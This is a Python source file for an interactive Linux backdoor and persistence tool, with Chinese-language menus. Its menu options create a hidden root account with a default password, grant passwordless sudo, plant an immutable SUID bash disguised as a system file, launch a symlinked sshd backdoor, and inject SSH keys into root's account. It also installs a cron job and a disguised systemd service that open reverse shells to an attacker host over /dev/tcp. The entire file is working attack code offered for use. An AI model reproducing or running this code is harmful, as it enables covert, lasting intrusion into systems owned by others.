#!/usr/bin/env python3
# -*- coding: UTF-8 -*-
import os
import sys
import subprocess
import socket
import shutil
from getpass import getpass

class BackdoorMaintainer:
    def __init__(self):
        self.hidden_bash_path = "/tmp/.systemd-service"
        self.ssh_backdoor_name = "kernel-module"
        self.systemd_service_name = "systemd-network.service"

    def show_menu(self):
        """显示主菜单"""
        print("""
         _____    _  __  ______   ______   _____ 
        |  __ \\  | |/ / |  ____| |  ____| |  __ \\ 
        | |__) | | ' /  | |__    | |__    | |__) |
        |  ___/  |  <   |  __|   |  __|   |  ___/
        | |      | . \\  | |____  | |____  | |     
        |_|      |_|\\_\\ |______| |______| |_|     by fangao
        
        请选择持久化方式：
            [1] 添加特权账户
            [2] 授予账户sudo权限
            [3] 创建隐藏的SUID shell
            [4] SSH软链接后门
            [5] 定时任务持久化
            [6] SSH密钥注入
            [7] systemd服务持久化
            [q] 退出
        """)

    def run_command(self, cmd, exit_on_error=True):
        """执行系统命令并返回结果"""
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                check=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            return result.stdout.strip()
        except subprocess.CalledProcessError as e:
            if exit_on_error:
                print(f"命令执行失败: {e.stderr}")
                sys.exit(1)
            return None

    def user_exists(self, username):
        """检查用户是否存在"""
        return os.path.exists(f'/home/{username}') or bool(
            self.run_command(f'getent passwd {username}', exit_on_error=False)
        )

    def add_backdoor_account(self):
        """添加特权账户"""
        username = input("请输入用户名（默认 sysmgmt）: ") or "sysmgmt"
        if self.user_exists(username):
            print(f"[!] 用户 {username} 已存在")
            return

        password = getpass("请输入密码（默认 Password123!）: ") or "Password123!"
        encrypted_pw = self.run_command(f"openssl passwd -1 '{password}'")
        
        self.run_command(
            f"useradd -o -u 0 -g 0 -N -M {username} -p '{encrypted_pw}' -s /bin/bash"
        )
        
        if self.user_exists(username):
            print(f"[+] 账户创建成功\n用户名: {username}\n密码: {password}")
        else:
            print("[!] 账户创建失败")

    def grant_sudo(self):
        """授予sudo权限"""
        username = input("请输入用户名: ")
        if not self.user_exists(username):
            print(f"[!] 用户 {username} 不存在")
            return

        sudo_line = f"{username} ALL=(ALL:ALL) NOPASSWD:ALL"
        if not os.path.exists('/etc/sudoers.d/01_custom'):
            self.run_command("touch /etc/sudoers.d/01_custom")
            
        with open('/etc/sudoers.d/01_custom', 'a') as f:
            f.write(f"\n{sudo_line}\n")
        
        print("[+] Sudo权限已授予")

    def create_suid_shell(self):
        """创建隐藏的SUID shell"""
        if os.path.exists(self.hidden_bash_path):
            print("[!] 隐藏shell已存在")
            return

        try:
            shutil.copy2('/bin/bash', self.hidden_bash_path)
            os.chmod(self.hidden_bash_path, 4755)
            self.run_command(f"chattr +i {self.hidden_bash_path}")
            self.run_command(f"touch -r /bin/bash {self.hidden_bash_path}")
            print(f"[+] SUID shell已创建于 {self.hidden_bash_path}")
            print("[+] 使用方式: ./kernel-service -p")
        except Exception as e:
            print(f"[!] 创建失败: {str(e)}")

    def setup_ssh_backdoor(self):
        """设置SSH软链接后门"""
        port = input("请输入监听端口 (默认 53389): ") or "53389"
        if not port.isdigit() or not (1 <= int(port) <= 65535):
            print("[!] 无效的端口号")
            return

        backdoor_path = f"/tmp/{self.ssh_backdoor_name}"
        if os.path.exists(backdoor_path):
            print("[!] 后门已存在")
            return

        self.run_command(f"ln -sf /usr/sbin/sshd {backdoor_path}")
        self.run_command(f"{backdoor_path} -oPort={port} -D &")
        print(f"[+] SSH后门已启动在端口 {port}")
        print(f"[+] 连接命令: ssh -T root@host -p {port}")

    def setup_cron_backdoor(self):
        """设置定时任务持久化"""
        lhost = input("请输入监听IP: ")
        lport = input("请输入监听端口: ")
        
        cron_job = f"*/3 * * * * /bin/bash -c 'exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do \$line 2>&5 >&5; done'"
        self.run_command(f"(crontab -l 2>/dev/null; echo '{cron_job}') | crontab -")
        print("[+] 定时任务已添加")

    def inject_ssh_key(self):
        """注入SSH公钥"""
        key_path = input("请输入公钥路径 (默认当前目录): ") or "./id_rsa.pub"
        
        if not os.path.exists(key_path):
            print("[!] 公钥文件不存在")
            return

        ssh_dir = "/root/.ssh"
        os.makedirs(ssh_dir, exist_ok=True)
        os.chmod(ssh_dir, 0o700)
        
        with open(f"{ssh_dir}/authorized_keys", 'a') as f:
            with open(key_path) as key_file:
                f.write("\n" + key_file.read().strip() + "\n")
        
        os.chmod(f"{ssh_dir}/authorized_keys", 0o600)
        print("[+] SSH公钥已注入")

    def setup_systemd_persistence(self):
        """设置systemd服务持久化"""
        lhost = input("请输入监听IP: ")
        lport = input("请输入监听端口: ")
        
        service_content = f"""
        [Unit]
        Description=Network Management Service
        After=network.target
        
        [Service]
        Type=simple
        ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/{lhost}/{lport} 0>&1; sleep 10; done'
        Restart=always
        RestartSec=5
        
        [Install]
        WantedBy=multi-user.target
        """
        
        service_path = f"/etc/systemd/system/{self.systemd_service_name}"
        with open(service_path, 'w') as f:
            f.write(service_content)
        
        self.run_command("systemctl daemon-reload")
        self.run_command(f"systemctl enable {self.systemd_service_name}")
        self.run_command(f"systemctl start {self.systemd_service_name}")
        print("[+] systemd持久化服务已安装")

    def main(self):
        while True:
            self.show_menu()
            choice = input("请选择操作 > ").lower()
            
            if choice == '1':
                self.add_backdoor_account()
            elif choice == '2':
                self.grant_sudo()
            elif choice == '3':
                self.create_suid_shell()
            elif choice == '4':
                self.setup_ssh_backdoor()
            elif choice == '5':
                self.setup_cron_backdoor()
            elif choice == '6':
                self.inject_ssh_key()
            elif choice == '7':
                self.setup_systemd_persistence()
            elif choice == 'q':
                print("[+] 退出程序")
                sys.exit(0)
            else:
                print("[!] 无效选项")
            
            input("\n按回车继续...")

if __name__ == '__main__':
    if os.geteuid() != 0:
        print("[!] 请使用root权限运行此脚本")
        sys.exit(1)
    BackdoorMaintainer().main()
